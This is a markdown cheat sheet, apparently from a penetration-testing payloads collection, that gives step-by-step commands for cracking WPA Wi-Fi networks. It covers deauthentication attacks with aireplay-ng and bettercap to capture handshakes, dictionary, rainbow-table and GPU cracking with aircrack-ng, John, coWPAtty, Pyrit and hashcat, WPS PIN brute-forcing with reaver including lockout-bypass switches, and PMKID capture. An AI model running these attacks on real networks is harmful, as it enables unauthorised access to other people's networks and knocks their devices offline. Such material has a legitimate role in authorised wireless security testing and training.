# Wifi - WPA Cracking

## Tools

* [aircrack-ng/aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) - WiFi security auditing tools suite
* [bettercap/bettercap](https://github.com/bettercap/bettercap)


## WPA PSK Attack

### Cracking WPA with John the Ripper

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w wpajohn mon0 # see no client

# deauthentication to get the WPA handshake (Sniffing should show the 4-way handshake)
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0

# crack without john the ripper (-b <BSSID>)
aircrack-ng -0 -w /pentest/passwords/john/password.lst wpajohn-01.cap
aircrack-ng -0 -w /pentest/passwords/john/password.lst wpajohn-01.cap 
aircrack-ng -w password.lst,secondlist.txt wpajohn-01.cap # multiple dicts

# crack with john the ripper - combine mangling rules with aircrack
# rules example to add in /pentest/passwords/john/john.conf
# $[0-9]$[0-9]
# $[0-9]$[0-9]$[0-9]
john --wordlist=/pentest/wireless/aircrack-ng/test/password.lst --rules --stdout | aircrack-ng -0 -e $AP_SSID -w - /root/wpajohn

# generate PMKs for a faster cracking - Precomputed WPA Keys Database Attack
echo wifu > essid.txt
airolib-ng test.db --import essid essid.txt
airolib-ng test.db --stats
airolib-ng test.db --import passwd /pentest/passwords/john/password.lst
airolib-ng test.db --batch
airolib-ng test.db --stats
aircrack-ng -r test.db wpajohn-01.cap
# airolib-ng test.db --clean all

# Not in lab - Convert to hccap to use with John Jumbo
aircrack-ng <FileName>.cap -J <outFile>
hccap2john <outFile>.hccap > <JohnOutFile>
john <JohnOutFile>
```

### Cracking WPA with coWPAtty

> Better for PMK Rainbow table attacks

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w wpacow mon0 # see no client

# deauthentication to get the WPA handshake
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0

# coWPAtty dictionary mode (slow)
cowpatty -r wpacow-01.cap -f /pentest/passwords/john/password.lst -2 -s $AP_SSID

# coWPAtty rainbow table mode (fast)
genpmk -f /pentest/passwords/john/password.lst -d wifuhashes -s $AP_SSID
cowpatty -r wpacow-01.cap -d wifuhashes -2 -s $AP_SSID
```

### Cracking WPA with Pyrit

> Can use GPU

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w wpapyrit mon0 # see no client

# deauthentication to get the WPA handshake
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0

# clean the cap and extract only good packets
pyrit -r wpapyrit-01.cap analyze
pyrit -r wpapyrit-01.cap -o wpastripped.cap strip

# dictionary attack - slow ++
pyrit -r wpapyrit-01.cap -i /pentest/passwords/john/password.lst -b $AP_MAC attack_passthrough

# pre-computed hashes attack - slow on CPU
pyrit eval # pwds in database
pyrit -i /pentest/passwords/john/password.lst import_passwords # import in the database
pyrit -e $AP_SSID create_essid
pyrit batch # generate
pyrit -r wpastripped.cap attack_db 

# gpu power attack - fast on GPU
pyrit list_cores
pyrit -i /pentest/passwords/john/password.lst import_passwords # import in the database
pyrit -e $AP_SSID create_essid
pyrit batch
pyrit -r wpastripped.cap attack_db 
```


### Cracking WPA with bettercap

* Install Bettercap
    ```powershell
    # install and update
    go get github.com/bettercap/bettercap
    cd $GOPATH/src/github.com/bettercap/bettercap
    make build && sudo make install
    sudo bettercap -eval "caplets.update; q"
    ```

* Scan for Wifi networks
    ```ps1
    # run and recon the wifi APs
    sudo bettercap -iface wlan0
    # this will set the interface in monitor mode and start channel hopping on all supported frequencies
    > wifi.recon on 
    # we want our APs sorted by number of clients for this attack, the default sorting would be `rssi asc`
    > set wifi.show.sort clients desc
    # every second, clear our view and present an updated list of nearby WiFi networks
    > set ticker.commands 'clear; wifi.show'
    > ticker on
    # use the good channel
    > wifi.recon.channel 1
    ```

* Execute the deauth attack
    ```powershell
    # use the bssid of the AP
    > wifi.deauth e0:xx:xx:xx:xx:xx
    /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx
    /path/to/hashcat -m 2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
    ```


## WPA WPS Attack

```powershell
airmon-ng start wlan0
airodump-ng mon0

# Install
apt-get -y install build-essential libpcap-dev aircrack-ng pixiewps
git clone https://github.com/t6x/reaver-wps-fork-t6x
apt-get install reaver

# Reaver integrated dumping tool (can also airodump-ng)
# Wash gives information about WPS being locked or not
# Locked WPS will have less success chances
wash -i mon0 

# Launch Reaver
reaver -i mon0 -b $AP_MAC -vv -S
reaver -i mon0 -c <Channel> -b $AP_MAC -p <PinCode> -vv -S
reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv


# Now using pixiexps, you can crack PIN offline
pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>
# Then, you can use the PIN with reaver to get to cleartext password
reaver -i <monitor interface> -b <bssid> -c <channel>  -p <PIN>


# Some manufacturers have implemented protections
# You can try different switches to bypass
# -L = Ignore locked state
# -N = Don't send NACK packets when errors are detected
# -d = delay X seconds between PIN attempts
# -T = set timeout period to X second (.5 means half second)
# -r = After X attemps, sleep for Y seconds
reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15
```

> Message "WARNING: Detected AP rate limiting, waiting 315 seconds before re-trying" -> AP is protected Message "WARNING: Receive timeout occured" -> AP is too far


## WPA PMKID Attack

```powershell
INTERFACE=$(ifconfig | grep wlp | cut -d":" -f1) # mon0

# PMKID capture
# Note: Based on the noise on the wifi channel it can take some time to receive the PMKID. 
# It can take a while to capture PKMID (several minutes++)
# We recommend running hcxdumptool up to 10 minutes before aborting.
# If an AP recieves our association request packet and supports sending 
# sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1
PMKID=$(sudo hcxdumptool -o test.pcapng -i $INTERFACE --enable_status  --filtermode=2)
echo $PMKID|grep 'FOUND PMKID' &> /dev/null
hcxpcaptool -z test.16800 test.pcapng

# Then convert the captured data to a suitable format for hashcat
# -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs)
# -I retrieve identities from WiFi-traffic
# -U retrieve usernames from WiFi-traffic
# PMKID*MAC AP*MAC Station*ESSID
# 2582a8281bf9d4308d6f5731d0e61c61*4604ba734d4e*89acf0e761f4*ed487162465a774bfba60eb603a39f3a
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng

# Cracking the HASH
hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
hashcat -m 16800 -d 1 -w 3 myHashes rockyou.txt 

# Check clGetPlatformIDs(): CL_PLATFORM_NOT_FOUND_KHR
```

**Bettercap WPA - PMKID attack**

```powershell
wifi.assoc all
/path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap
/path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
```


## References

* [TODO](TODO)